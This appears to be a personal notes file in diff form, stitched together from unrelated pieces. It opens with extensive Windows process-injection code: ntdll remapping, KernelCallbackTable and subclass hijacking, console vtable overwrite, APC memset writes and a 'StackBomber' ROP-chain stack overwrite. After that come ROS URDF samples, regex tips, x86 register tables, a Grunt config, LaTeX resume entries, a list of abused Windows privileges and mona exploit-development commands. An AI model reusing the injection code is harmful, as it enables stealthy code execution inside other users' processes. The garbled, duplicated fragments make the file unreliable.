+HANDLE ntdll= GetModuleHandleA("ntdll");
+GetModuleInformation(GetCurrentProcess(), ntdll , &ntdll_info,
+sizeof(ntdll_info));
+HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE,
+0, ntdll_info.SizeOfImage, NULL);
+LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION |
+PROCESS_SUSPEND_RESUME, FALSE, process_id);
+ntdll!NtSuspendProcess(p);
+ReadProcessMemory(p, ntdll, map_addr, ntdll_info.SizeOfImage, NULL);
+// Patch NtClose in map_addr
+// …
+ntdll!NtUnmapViewOfSection(p, ntdll);
+SIZE_T view_size=0;
+ntdll!NtMapViewOfSection(fm, p, &ntdll, 0, ntdll_info.SizeOfImage, NULL,
+&view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE );
+FlushInstructionCache(p, ntdll, ntdll_info.SizeOfImage);
+ntdll!NtResumeProcess(p);
+
+
+
+GetWindowThreadProcessId(h, &process_id);
+HWND hst = GetDlgItem(h, 303); // System Tray
+HWND hc = GetDlgItem(hst, 1504);
+HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
+char new_subclass[0x50];
+HANDLE target_new_subclass = (HANDLE)VirtualAllocEx(p, NULL, sizeof(new_subclass),
+MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+HANDLE old_subclass = GetProp(hc, "UxSubclassInfo"); //handle is the memory
+address of the current subclass structure
+ReadProcessMemory(p, (LPCVOID)old_subclass, (LPVOID)new_subclass,
+sizeof(new_subclass), NULL);
+DWORD64 target_execution_ptr_value=target_execution;
+memcpy(new_subclass + 0x18, &target_execution_ptr_value,
+sizeof(target_execution_ptr_value));
+WriteProcessMemory(p, (LPVOID)(target_new_subclass), (LPVOID)new_subclass,
+sizeof(new_subclass), NULL); // Or any other write memory primitive
+SetProp(hc, "UxSubclassInfo", target_new_subclass);
+PostMessage(hc, WM_KEYDOWN, VK_NUMPAD1, 0);
+Sleep(1); // YMMV
+SetProp(hc, "UxSubclassInfo", old_subclass);
+
+
+HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION| PROCESS_VM_OPERATION|
+PROCESS_VM_READ| PROCESS_VM_WRITE, FALSE, process_id);
+PROCESS_BASIC_INFORMATION pbi;
+ntdll!NtQueryInformationProcess(p,ProcessBasicInformation, &pbi, sizeof(pbi),
+NULL);
+PEB peb;
+ReadProcessMemory(p, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
+KERNELCALLBACKTABLE kct;
+ReadProcessMemory(p, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);
+LPVOID target_payload = VirtualAllocEx(p, NULL, sizeof(payload),MEM_RESERVE |
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(p, target_payload, payload, sizeof(payload), NULL);
+LPVOID target_kct = VirtualAllocEx(p, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT,
+PAGE_READWRITE);
+kct.__fnCOPYDATA = (ULONG_PTR)target_payload;
+WriteProcessMemory(p, target_kct, &kct, sizeof(kct), NULL);
+WriteProcessMemory(p, (PBYTE)pbi.PebBaseAddress + offsetof(PEB,
+KernelCallbackTable), &target_kct, sizeof(ULONG_PTR), NULL);
+COPYDATASTRUCT cds;
+cds.dwData = 1;
+wchar_t msg[] = L"foo";
+cds.cbData = lstrlenW(msg) * 2;
+cds.lpData = msg;
+SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds); // hw can be obtained via
+e.g. EnumWindows
+// Cleanup
+WriteProcessMemory(p, (PBYTE)pbi.PebBaseAddress + offsetof(PEB,
+KernelCallbackTable), &peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL);
+
+
+HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE,
+process_id); // PROCESS_VM_OPERATION is required for RtlEncodeRemotePointer
+void* encoded_addr = NULL;
+ntdll!RtlEncodeRemotePointer(h, target_execution, &encoded_addr);
+// Use any Memory Write Primitive here…
+WriteProcessMemory(h, kernelbase!SingleHandler, &encoded_addr, 8, NULL);
+INPUT ip;
+ip.type = INPUT_KEYBOARD;
+ip.ki.wScan = 0;
+ip.ki.time = 0;
+ip.ki.dwExtraInfo = 0;
+ip.ki.wVk = VK_CONTROL;
+ip.ki.dwFlags = 0; // 0 for key press
+SendInput(1, &ip, sizeof(INPUT));
+Sleep(100);
+PostMessageA(hWindow, WM_KEYDOWN, 'C', 0); // hWind
+
+
+
+Sleep(100);
+ip.type = INPUT_KEYBOARD;
+ip.ki.wScan = 0;
+ip.ki.time = 0;
+ip.ki.dwExtraInfo = 0;
+ip.ki.wVk = VK_CONTROL;
+ip.ki.dwFlags = KEYEVENTF_KEYUP;
+SendInput(1, &ip, sizeof(INPUT));
+// Restore the original Ctrl handler in the target process
+ntdll!RtlEncodeRemotePointer(h, kernelbase!DefaultHandler, &encoded_addr);
+// Use any Memory Write Primitive here…
+WriteProcessMemory(h, kernelbase!SingleHandler, &encoded_addr, 8, NULL);
+
+
+
+DWORD conhost_id = conhostId(process_id);
+HANDLE hp = OpenProcess(PROCESS_VM_READ|PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
+FALSE, conhost_id);
+LPVOID target_payload = VirtualAllocEx(hp, NULL, sizeof(payload), MEM_COMMIT |
+MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hp, target_payload, payload, sizeof(payload), NULL);
+LONG_PTR udptr = GetWindowLongPtr(hWindow, GWLP_USERDATA);
+ULONG_PTR vTable;
+ReadProcessMemory(hp, (LPVOID)udptr, (LPVOID)&vTable, sizeof(ULONG_PTR), NULL);
+ConsoleWindow cw;
+ReadProcessMemory(hp, (LPVOID)vTable, (LPVOID)&cw, sizeof(ConsoleWindow), NULL);
+LPVOID target_cw = VirtualAllocEx(hp, NULL, sizeof(ConsoleWindow), MEM_COMMIT |
+MEM_RESERVE, PAGE_READWRITE);
+cw.GetWindowHandle = (ULONG_PTR)target_payload;
+WriteProcessMemory(hp, target_cw, &cw, sizeof(ConsoleWindow), NULL);
+WriteProcessMemory(hp, (LPVOID)udptr, &target_cw, sizeof(ULONG_PTR), NULL);
+SendMessage(hWindow, WM_SETFOCUS, 0, 0);
+WriteProcessMemory(hp, (LPVOID)udptr, &vTable, sizeof(ULONG_PTR), NULL);
+
+
+
+HANDLE ntdll= GetModuleHandleA("ntdll");
+HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
+for (int i = 0; i < sizeof(payload); i++)
+{
+ntdll!NtQueueApcThread(t, GetProcAddress(ntdll, "memset"),
+(void*)(target_payload+i), (void*)*(((BYTE*)payload)+i), 1);
+}
+// Can finish with the “atomic” ntdll!NtQueueApcThread(t, GetProcAddress(ntdll,
+"memmove"), (void*)target_payload_final,
+// (void*)target_payload,
+sizeof(payload));
+
+
+
+
+26. “StackBomber” write primitive and execution method (NEW! 2019)
+Invented by Amit Klein, Itzik Kotler, Safebreach. NOTE: Yuki Chen anticipated stack overwrite as
+an execution method in 2015 (https://www.blackhat.com/docs/eu-15/materials/eu-15-ChenHey-Man-Have-You-Forgotten-To-Initialize-Your-Memory.pdf), but he did not elaborate or
+demonstrate, also he did not describe how to find and overwrite TOS safely, such that control is
+passed to the payload without crashing the original function first.
+Naïve (and using memset/APC as a writing technique):
+a. Read RSP via GetThreadContext
+b. Override stack data with new stack, via NtQueueUserAPC(ntdll!memset, thread,
+destination,byte,1). Specifically, the return address stored on the stack is overwritten.
+Execution will commence once the alertable function returns.
+Note that the 5 alertable functions call NtXXX functions which are simple wrappers around
+SYSCALL (SleepEx -> NtDelayExecution, WaitForSingleObjectEx -> NtWaitForSingleObject,
+WaitForMultipleObjectsEx -> NtWaitForMultipleObjects, SignalObjectAndWait ->
+NtSignalAndWaitForSingleObject, RealMsgWaitForMultipleObjectsEx ->
+NtUserMsgWaitForMultipleObjectsEx). These five NtXXX functions use the following template:
+mov r10,rcx
+mov eax,SERVICE_DESCRIPTOR
+test byte ptr [SharedUserData+0x308],1
+jne +3
+syscall
+ret
+int 2E
+ret
+So these functions don’t use the stack, therefore RSP ==TOS contains the return address, hence
+we know exactly where to place the ROP chain.
+We can generalize this – knowing RIP usually allows us to determine where the return address
+is, relative to RSP. The above case becomes a special case wherein the return address offset
+
+
+StackBomber
+
+HANDLE ntdll= GetModuleHandleA("ntdll");
+HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT |
+THREAD_SUSPEND_RESUME, FALSE, thread_id);
+SuspendThread(t);
+CONTEXT ctx;
+ctx.ContextFlags = CONTEXT_ALL;
+GetThreadContext(t, &ctx);
+DWORD64 tos = (DWORD64)ctx.Rsp;
+for (int i = 0; i < sizeof(ROP_chain); i++)
+{
+ntdll!NtQueueApcThread(t, GetProcAddress(ntdll, "memset"), (void*)(tos+i),
+(void*)*(((BYTE*)ROP_chain)+i), 1);
+}
+ResumeThread(t);
+
+
+Backup the current stack first (using memmove), then restore it and the registers. Note:
+in order to accommodate the backup stack, the stack can be grown by writing a dummy
+value every 4KB (allocating a new page each time).
+• Alternatively, the stack can be read by the injector process, using a memory read
+primitive (e.g. ReadProcessMemory), and embedded in the payload.
+• Pivot to a new memory immediately – this ruins only the return address, and another
+QWORD above it (which is anyway reserved for the leaf function and unused by the 5
+leaf functions mentioned above, hence can be safely overwritten with no need for
+restoration). The payload needs to restore RSP and the return address (only).
+As for restoring registers, the 5 leaf functions do not rely on volatile registers when transferring
+control to the kernel, and thus it is safe to modify the volatile registers, but the non-volatile
+registers must be restored. Keep in mind that calling other (system) functions from the payload
+does not modify the non-volatile registers since they are restored before control is returned to
+the main payload. Thus, if the payload is written to only use volatile registers, it will be safe
+(with no need to restore registers).
+A safe version (including clean-up):
+// payload mustn’t modify non-volatile registers, must copy the saved return
+address to the original tos location (e.g. using memmove)
+// and must restore rsp and control when it’s done, e.g. using GADGET_pivot.
+HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT |
+THREAD_SUSPEND_RESUME, FALSE, thread_id);
+SuspendThread(t);
+CONTEXT context;
+context.ContextFlags = CONTEXT_ALL;
+GetThreadContext(t, &context)
+DWORD64 orig_tos = (DWORD64)context.Rsp;
+DWORD64 tos = orig_tos-0x2000; // 0x2000 experimentally works…
+// Grow the stack to accommodate the new stack
+for (DWORD64 i = orig_tos - 0x1000; i >= tos; i -= 0x1000)
+{
+(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(i),
+(void*)0, 1);
+}
+// Write the new stack
+payload[saved_tos]=orig_tos;
+for (int i = 0; i < sizeof(payload); i++)
+{
+(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(tos + i),
+(void*)*(((BYTE*)payload) + i), 1);
+}
+// Save the original return address into the new stack
+(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memmove"),
+(void*)(payload[saved_return_address]), (void*)orig_tos, 8);
+// overwrite the original return address with GADGET_pivot
+for (int i = 0; i < sizeof(tos); i++)
+{
+(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos +
+i), (void*)(((BYTE*)&GADGET_pivot)[i]), 1);
+}
+// overwrite the original tos+8 with the new tos address (we don't need to restore
+this since it's shadow stack and not used by the leaf function!)
+for (int i = 0; i < sizeof(tos); i++)
+{
+(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos +
+8 + i), (void*)(((BYTE*)&tos)[i]), 1);
+}
+ResumeThread(t);
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------
+
+
+ROS programming 
+-----------------------
+
+<?xml version="1.0"?> 
+<robot name="pan_tilt"> 
+  <link name="base_link"> 
+    <visual> 
+      <geometry> 
+      <cylinder length="0.01" radius="0.2"/> 
+      </geometry> 
+      <origin rpy="0 0 0" xyz="0 0 0"/> 
+	  <?xml version="1.0"?> 
+<robot name="pan_tilt"> 
+  <link name="base_link"> 
+    <visual> 
+      <geometry> 
+      <cylinder length="0.01" radius="0.2"/> 
+      </geometry> 
+      <origin rpy="0 0 0" xyz="0 0 0"/> 
+	  
+	  
+	  
+	   <material name="yellow"> 
+        <color rgba="1 1 0 1"/> 
+      </material> 
+    </visual> 
+  </link> 
+  <joint name="pan_joint" type="revolute"> 
+    <parent link="base_link"/> 
+    <child link="pan_link"/> 
+    <origin xyz="0 0 0.1"/> 
+    <axis xyz="0 0 1" /> 
+  </joint> 
+  <link name="pan_link"> 
+    <visual> 
+      <geometry> 
+      <cylinder length="0.4" radius="0.04"/> 
+      </geometry> 
+      <origin rpy="0 0 0" xyz="0 0 0.09"/> 
+      <material name="red"> 
+        <color rgba="0 0 1 1"/> 
+      </material> 
+    </visual> 
+  </link> 
+  <joint name="tilt_joint" type="revolute"> 
+    <parent link="pan_link"/> 
+    <child link="tilt_link"/> 
+    <origin xyz="0 0 0.2"/> 
+    <axis xyz="0 1 0" /> 
+  </joint> 
+  <link name="tilt_link"> 
+    <visual> 
+      <geometry> 
+  <cylinder length="0.4" radius="0.04"/> 
+      </geometry> 
+      <origin rpy="0 1.5 0" xyz="0 0 0"/> 
+      <material name="green"> 
+        <color rgba="1 0 0 1"/> 
+      </material> 
+    </visual> 
+  </link> 
+</robot>
+
+
+check_urdf pan_tilt.urdf  
+
+$ urdf_to_graphiz pan_tilt.urdf 
+
+This command will generate two files: pan_tilt.gv and pan_tilt.pdf. We can view the structure of this robot using this command:$ evince pan_tilt.pdf  
+We will get the following output:
+evince pan_tilt.pdf 
+
+
+<launch> 
+  <arg name="model" /> 
+  <param name="robot_description" textfile="$(find mastering_ros_robot_description_pkg)/urdf/pan_tilt.urdf" /> 
+  <param name="use_gui" value="true"/> 
+  <node name="joint_state_publisher" pkg="joint_state_publisher" type="joint_state_publisher" /> 
+  <node name="robot_state_publisher" pkg="robot_state_publisher" type="state_publisher" /> 
+  <node name="rviz" pkg="rviz" type="rviz" args="-d $(find mastering_ros_robot_description_pkg)/urdf.rviz" required="true" /> 
+</launch> 
+
+roslaunch mastering_ros_robot_description_pkg view_demo.launch  
+
+
+<joint name="pan_joint" type="revolute"> 
+    <parent link="base_link"/> 
+    <child link="pan_link"/> 
+    <origin xyz="0 0 0.1"/> 
+    <axis xyz="0 0 1" /> 
+    <limit effort="300" velocity="0.1" lower="-3.14" upper="3.14"/> 
+    <dynamics damping="50" friction="1"/> 
+  </joint>
+  
+  <link> 
+......     
+<collision> 
+      <geometry> 
+      <cylinder length="0.03" radius="0.2"/> 
+      </geometry> 
+      <origin rpy="0 0 0" xyz="0 0 0"/> 
+    </collision> 
+ 
+    <inertial> 
+    <mass value="1"/> 
+    <inertia ixx="1.0" ixy="0.0" ixz="0.0" iyy="1.0" iyz="0.0" izz="1.0"/> 
+    </inertial> 
+........... 
+</link> 
+
+
+<?xml version="1.0"?> 
+<robot xmlns:xacro="http://www.ros.org/wiki/xacro" name="pan_tilt"> 
+
+<xacro:property name="base_link_length" value="0.01" /> 
+  <xacro:property name="base_link_radius" value="0.2" /> 
+  <xacro:property name="pan_link_length" value="0.4" /> 
+  <xacro:property name="pan_link_radius" value="0.04" /> 
+We can use the value of the variable by replacing the hardcoded value with the following definition:  <cylinder length="${pan_link_length}" 
+ radius="${pan_link_radius}"/> 
+ 
+ 
+ 
+ 
+ 
+ 
+  
+  
+<cylinder length="${pan_link_length}" 
+ radius="${pan_link_radius+0.02}"/
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ A tip 
+ --------------
+ You can use the Visual Studio build in replacement (Ctrl + H) with an activate regex search.
+
+Visual Studio RegEx Replace
+
+As already shown in the image, use \/\/.*\n as expression and nothing as replacement. But as i  pointed out in the comments below: You have to be careful, because this regex also matches strings containing //.
+
+If your inline comments are just single lines with /* some comment */ you can use \/\*.*\*\/.
+
+And for matching single and multiline comments /* */ you can use \/\*(.*?\n?)*\*\/.
+ 
+ 
+ For PCRE, and most other so-called Perl-compatible flavors, escape these outside character classes:
+
+.^$*+?()[{\|
+and these inside character classes:
+
+^-]\
+For POSIX extended regexes (ERE), escape these outside character classes (same as PCRE):
+
+.^$*+?()[{\|
+Escaping any other characters is an error with POSIX ERE.
+
+Inside character classes, the backslash is a literal character in POSIX regular expressions. You cannot use it to escape anything. You have to use "clever placement" if you want to include character class metacharacters as literals. Put the ^ anywhere except at the start, the ] at the start, and the - at the start or the end of the character class to match these literally, e.g.:
+
+[]^-]
+In POSIX basic regular expressions (BRE), these are metacharacters that you need to escape to suppress their meaning:
+
+.^$*[\
+Escaping parentheses and curly brackets in BREs gives them the special meaning their unescaped versions have in EREs. Some implementations (e.g. GNU) also give special meaning to other characters when escaped, such as \? and +. Escaping a character other than .^$*(){} is normally an error with BREs.
+
+Inside character classes, BREs follow the same rule as EREs.
+ 
+ 
+ 
+ 
+ Escape the metacharacters like: .[{()\^$|?*+ - so searching for ? in the code should be done by \?
+ 
+ 
+ 
+ 
+ Pwnlib
+ ----------------
+ 
+ +-----------------+---------------+---------------+------------+
+| 8 Byte Register | Lower 4 Bytes | Lower 2 Bytes | Lower Byte |
++-----------------+---------------+---------------+------------+
+|   rbp           |     ebp       |     bp        |     bpl    |
+|   rsp           |     esp       |     sp        |     spl    |
+|   rip           |     eip       |               |            |
+|   rax           |     eax       |     ax        |     al     |
+|   rbx           |     ebx       |     bx        |     bl     |
+|   rcx           |     ecx       |     cx        |     cl     |
+|   rdx           |     edx       |     dx        |     dl     |
+|   rsi           |     esi       |     si        |     sil    |
+|   rdi           |     edi       |     di        |     dil    |
+|   r8            |     r8d       |     r8w       |     r8b    |
+|   r9            |     r9d       |     r9w       |     r9b    |
+|   r10           |     r10d      |     r10w      |     r10b   |
+|   r11           |     r11d      |     r11w      |     r11b   |
+|   r12           |     r12d      |     r12w      |     r12b   |
+|   r13           |     r13d      |     r13w      |     r13b   |
+|   r14           |     r14d      |     r14w      |     r14b   |
+|   r15           |     r15d      |     r15w      |     r15b   |
++-----------------+---------------+---------------+------------+
+
+rdi:    First Argument
+rsi:    Second Argument
+rdx:    Third Argument
+rcx:    Fourth Argument
+r8:     Fifth Argument
+r9:     Sixth Argument
+
+
+rbp: Base Pointer, points to the bottom of the current stack frame
+rsp: Stack Pointer, points to the top of the current stack frame
+rip: Instruction Pointer, points to the instruction to be executed
+
+General Purpose Registers
+These can be used for a variety of different things
+rax:
+rbx:
+rcx:
+rdx:
+rsi:
+rdi:
+r8:
+r9:
+r10:
+r11:
+r12:
+r13:
+r14:
+r15:
+
+
+
+00:     Carry Flag
+01:     always 1
+02:     Parity Flag
+03:     always 0
+04:     Adjust Flag
+05:     always 0
+06:     Zero Flag
+07:     Sign Flag
+08:     Trap Flag
+09:     Interruption Flag     
+10:     Direction Flag
+11:     Overflow Flag
+12:     I/O Privilege Field lower bit
+13:     I/O Privilege Field higher bit
+14:     Nested Task Flag
+15:     Resume Flag
+
+
+
+objdump -D hello_world -M intel | less
+
+
+check instruction here
+https://www.masswerk.at/6502/6502_instruction_set.html
+
+
+
+
+options:{
+        module:'commonjs',
+        target:'es2017', 
+        basePath:'./src/static/ts/app',
+        sourceMap: true,
+        declaration: true
+      }, 
+      base :{
+        src :['./src/static/*/*.ts'],
+        dest: './_site/assets/js',
+		
+		
+		npm install typescript@next
+		----------------------------------------------------------------------------------------------------------------------------------
+		module.exports = function(grunt) {
+ // Project configuration.
+ grunt.initConfig({
+   pkg: grunt.file.readJSON('package.json'),
+    connect: {
+     uses_defaults: {}
+   },
+    sass: {
+     dev: {
+       options: { sourceMap: true },
+       files: { 'sites/all/themes/uj/css/uj.styles.css' : 'sites/all/themes/uj/sass/uj.styles.scss' }     
+    }
+   },
+   watch: {
+    css: {
+      files: 'sites/all/themes/uj/**/*.scss',
+      tasks: [ 'sass:dev' ],
+      options: { livereload: true }
+ }
+}
+
+
+
+ });
+ // Load Grunt plugins
+// grunt.loadNpmTasks('');
+ // Default task(s).
+ grunt.registerTask('default', []);
+
+
+
+// Load Grunt plugins
+grunt.loadNpmTasks('grunt-contrib-connect');
+grunt.loadNpmTasks('grunt-sass');
+grunt.loadNpmTasks('grunt-contrib-watch');
+
+
+};
+
+
+
+extra
+
+
+%-------------------------------------------------------------------------------
+%	SECTION TITLE
+%-------------------------------------------------------------------------------
+\cvsection{Extracurricular Activity}
+
+
+%-------------------------------------------------------------------------------
+%	CONTENT
+%-------------------------------------------------------------------------------
+\begin{cventries}
+
+%---------------------------------------------------------
+  \cventry
+    {Deep Learning Engineer} % Affiliation/role
+    {Artificial Intelligence Professional (Internship on Interview ))} % Organization/group
+    {Alliance Technology , Dubai , UAE      /Russia based Company } % Location
+    {Aug. 2020 - Dec. 2020} % Date(s)
+    {
+      \begin{cvitems} % Description(s) of experience/contributions/knowledge
+        \item {I was trained as a expert there , but I am more skeptical than any other scientific evangelist . I was not convinced that life science algorithm conducted with the existing research approaches at the current level of human civilization could be considered as “science” . That was part of the motivations which caused me to leave that field (Genetic root of Simple Programming that's how developed setup my interest in AI ). I should be grateful that I have learned mathematics and programming well in college, and I met machine learning when I was at the lowest point of my life.}
+        \item {The research and engineering interests that I showcased with them are mainly in the areas of machine learning, artificial intelligence, general computer science, and user-friendly software engineering.  }
+        \item{The company were persuaded with my performance as an intern , that was the time when we got an Opportunity to meet up at the address Expo for  Improved Intelligence on \textbf {Apple tech}}
+      \end{cvitems}
+    }
+
+%---------------------------------------------------------
+  \cventry
+    {Cyber Team Operator (Security \&  processing field)} % Affiliation/role
+    {ELV Alliance Technology (Cyber Wing) , Dubai , UAE      /Russia based Company} % Organization/group
+    {Dubai, UAE} % Location
+    {May. 2020 - July. 2020} % Date(s)
+    {
+      \begin{cvitems} % Description(s) of experience/contributions/knowledge
+        \item {Content and course developer supporting Defense Threat Reduction Wing of the Company Emulated advanced persistent threats as a penetration tester with expertise in host and network exploitation.}
+        \item {Assisted in the development of the cyber red team management Standard Operating Procedure documentation Developed " Strategies for Kernel Security and open Source intelligent Gathering techniques " for safety inspection.}
+        \item {worked on Hosting a "Capture the Flag(CTF)" competition utilizing Docker but in between I had to drop it to plunge back to college to continue the rail .In interest of my previous internship with the company , they got me a specialized training on "Cisco Security Operations"}
+        \item {Conducted penetration testing commissioned by national agency and corporation.}
+      \end{cvitems}
+    }
+
+%---------------------------------------------------------
+\end{cventries}
+
+
+education
+%-------------------------------------------------------------------------------
+%	SECTION TITLE
+%-------------------------------------------------------------------------------
+\cvsection{Education}
+
+
+%-------------------------------------------------------------------------------
+%	CONTENT
+%-------------------------------------------------------------------------------
+\begin{cventries}
+
+%---------------------------------------------------------
+  \cventry
+    {Btech Specialization in Gaming, AI} % Degree
+    {VIT(Vellore Institute of Technology))} % Institution
+    {Bhopal , Madhya Pradesh} % Location
+    {April. 2018 - May. 2022} % Date(s)
+    {
+      \begin{cvitems} % Description(s) bullet points
+        \item {“Computer security was self- taught, it was largely in terms of models for access control, and I think tended to focus more on the concept of securing multiple-user computer systems and users’ access to them being seen as more of an atomic model than as bits and pieces of a larger, more globally-interconnected system.. Some of the Knowledge came from reading standard computer science and engineering and reference tomes, and learning about computer and network operations, and some from … shall we say, unofficial and very hands-on experimentation,”.}
+      \end{cvitems}
+    }
+
+%---------------------------------------------------------
+\end{cventries}
+
+
+committies
+
+%-------------------------------------------------------------------------------
+%	SECTION TITLE
+%-------------------------------------------------------------------------------
+\cvsection{Program Committees}
+
+
+%-------------------------------------------------------------------------------
+%	CONTENT
+%-------------------------------------------------------------------------------
+\begin{cvhonors}
+
+%---------------------------------------------------------
+  \cvhonor
+    {Program Speaker} % Position
+    {2020  GITEX  technology Meet (Cyber)} % Committee
+    {Dubai , UAE} % Location
+    {2020} % Date(s)
+
+%---------------------------------------------------------
+  \cvhonor
+    {Organizer \& Co-director} % Position
+    {Hackathon(Dockerized) for ELVAlliance, Dubai } % Committee
+    {UAE} % Location
+    {2020} % Date(s)
+
+%---------------------------------------------------------
+\end{cvhonors}
+
+
+writing
+%-------------------------------------------------------------------------------
+%	SECTION TITLE
+%-------------------------------------------------------------------------------
+\cvsection{Writing}
+
+
+%-------------------------------------------------------------------------------
+%	CONTENT
+%-------------------------------------------------------------------------------
+\begin{cventries}
+
+%---------------------------------------------------------
+  \cventry
+    {Team Operator \&  Instructor} % Role
+    {A Guide to Open Blockchain Tech} % Title
+    {Live at Expo Centre} % Location
+    {Jan. 2021} % Date(s)
+    {
+      \begin{cvitems} % Description(s)
+        \item {Drafted a Application Design for Coin trading using Java providing data collection and export, complex event processing and triggering, and backtesting}
+      \end{cvitems}
+    }
+
+%---------------------------------------------------------
+\end{cventries}
+
+
+honors
+
+
+%-------------------------------------------------------------------------------
+%	SECTION TITLE
+%-------------------------------------------------------------------------------
+\cvsection{Honors \& Awards}
+
+
+%-------------------------------------------------------------------------------
+%	SUBSECTION TITLE
+%-------------------------------------------------------------------------------
+\cvsubsection{International}
+
+
+%-------------------------------------------------------------------------------
+%	CONTENT
+%-------------------------------------------------------------------------------
+\begin{cvhonors}
+
+%---------------------------------------------------------
+
+
+  \cvhonor
+    {IABAC} % Award
+    {Artificial Intelligence on business Development } % Event
+    {IABAC  Certification Exam} % Location
+    {2020} % Date(s)
+
+	
+%---------------------------------------------------------
+%---------------------------------------------------------
+  \cvhonor
+    {Best Performer} % Award
+    {Those Working Days at company } % Event
+    {Dubai, U.A.E} % Location
+    {2020} % Date(s)
+
+%---------------------------------------------------------
+  \cvhonor
+    {Community Project} % Award
+    {Open Coach Training NLP} % Event
+    {Dubai, U.A.E} % Location
+    {2019} % Date(s)
+
+%---------------------------------------------------------
+  \cvhonor
+    {Pool Finalist} % Award
+    {Boston CTF} % Event
+    {Dubai ,  U.A.E} % Location
+    {2019} % Date(s)
+
+%---------------------------------------------------------
+  \cvhonor
+    {Finalist Creative Idea (Covid Planning)} % Award
+    {Open Idea Contribution, Gsoc } % Event
+    {Dubai, U.A.E} % Location
+    {2019} % Date(s)
+
+%---------------------------------------------------------
+  \cvhonor
+    {Creator} % Award
+    { CUCA Scholarship} % Event
+    {Dubai, U.A.E} % Location
+    {2018} % Date(s)
+
+%---------------------------------------------------------
+\end{cvhonors}
+
+
+
+
+summary
+%-------------------------------------------------------------------------------
+%	SECTION TITLE
+%-------------------------------------------------------------------------------
+\cvsection{Summary}
+
+
+%-------------------------------------------------------------------------------
+%	CONTENT
+%-------------------------------------------------------------------------------
+\begin{cvparagraph}
+
+%---------------------------------------------------------
+I am self-learner and working confident, curious, and perpetually. I have good experience in developing software platforms for real world problems, and I am working on several communities for improving the technical knowledge in the society. I have good leadership, organizing, and communication skills.
+
+I am a perfectionist. I want to solve the problems in my hands in perfect ways, which is, however, not achievable in many situations. I also apply Bellman Equation in the optimization of my life, which is a Markov decision process, but the future discount factor γ in the equation might be small and I would often be trapped in local optimum.
+\end{cvparagraph}
+
+
+
+The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
+
+SeImpersonatePrivilege
+SeAssignPrimaryPrivilege
+SeTcbPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeCreateTokenPrivilege
+SeLoadDriverPrivilege
+SeTakeOwnershipPrivilege
+SeDebugPrivilege
+
+
+
+
+
+
+MONA commands
 ----------------------
+a
+!mona assemble  -s "pop eax#inc ebx#ret"
+Log data
+bf - breakpoint 
+!mona bf -a {addr} -t Read
+!mona bytearray -b '{array of bytes'
+!mona compare -f bytearray.bin
+!mona dump - s {addr} -e [addr] -f "file path"
+egg
+!mona filecompare -f "c:\temp\{path to txt file}"
+!mona find -type asc -s "somethig"
+!mona find -type instr - s "jmp ecx" -p2p -x X
+!mona find -type file -s "{file path}" -p2p -x *
+!mona bp -t READ -a {ADDR}
+findmsp 
+findwild
+!mona fildwild -s "push jskdfhskhfkjshdkj"
+getpc 
+getiat
+header
+heap 
+help
+info 
+j 
+jump 
+jop 
+jseh 
+modules
+noaslr
+nosafeseh 
+ nosafesehaslr
+ offset
+ p 
+ p1 
+ p2
+ pattern_create
+pattern_offset
+pc
+po
+rop 
+ropfunc
+seh 
+stackvpivot
+stacks
+suggest 
+skeleton 
+metasploit
+
+
+features of AWS  instances 
+---------------------------------
+Amazon EC2 instances provide a number of additional features to help you deploy, manage, and scale your applications.
+Burstable Performance Instances
+Amazon EC2 allows you to choose between Fixed Performance Instances (e.g. M5, C5, and R5) and Burstable Performance Instances (e.g. T3). Burstable Performance Instances provide a baseline level of CPU performance with the ability to burst above the baseline.
+
+T Unlimited instances can sustain high CPU performance for as long as a workload needs it. For most general-purpose workloads, T Unlimited instances will provide ample performance without any additional charges. The hourly T instance price automatically covers all interim spikes in usage when the average CPU utilization of a T instance is at or less than the baseline over a 24-hour window. If the instance needs to run at higher CPU utilization for a prolonged period, it can do so at a flat additional charge of 5 cents per vCPU-hour.
+
+T instances’ baseline performance and ability to burst are governed by CPU Credits. Each T instance receives CPU Credits continuously, the rate of which depends on the instance size. T instances accrue CPU Credits when they are idle, and use CPU credits when they are active. A CPU Credit provides the performance of a full CPU core for one minute.
+
+For example, a t2.small instance receives credits continuously at a rate of 12 CPU Credits per hour. This capability provides baseline performance equivalent to 20% of a CPU core (20% x 60 mins = 12 mins). If the instance does not use the credits it receives, they are stored in its CPU Credit balance up to a maximum of 288 CPU Credits. When the t2.small instance needs to burst to more than 20% of a core, it draws from its CPU Credit balance to handle this surge automatically.
+
